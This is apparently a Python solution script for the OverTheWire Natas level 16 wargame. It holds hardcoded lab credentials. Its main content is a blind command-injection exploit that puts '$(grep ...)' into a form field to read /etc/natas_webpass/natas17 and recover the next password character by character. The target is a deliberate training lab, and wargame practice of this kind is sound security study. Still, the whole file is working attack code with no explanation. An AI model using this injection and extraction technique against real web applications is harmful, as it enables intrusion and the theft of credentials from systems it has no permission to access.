import requests

def reduce_charset(charset):
	reduced_charset = ''
	for c in charset:
		path = 'http://natas16.natas.labs.overthewire.org/index.php'
		auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
		data = {'needle':'potato$(grep {} /etc/natas_webpass/natas17)'.format(c)}
		r = requests.post(path, auth=auth, data=data)
		if 'potato' not in r.text:
			reduced_charset += c
	return reduced_charset

def interrogate(reduced_charset):
	password = ''
	for i in range(0,32):
		for c in reduced_charset:
			path = 'http://natas16.natas.labs.overthewire.org/index.php'
			auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
			data = {'needle':'potato$(grep ^{}{} /etc/natas_webpass/natas17)'.format(password, c)}
			r = requests.post(path, auth=auth, data=data)
			if 'potato' not in r.text:
				password += c
				break
	return password


def main():
	charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
	print('Reducing character set...')
	reduced_charset = reduce_charset(charset)
	print(reduced_charset)
	print('Interrogating...')
	password = interrogate(reduced_charset)
	print(password)

main()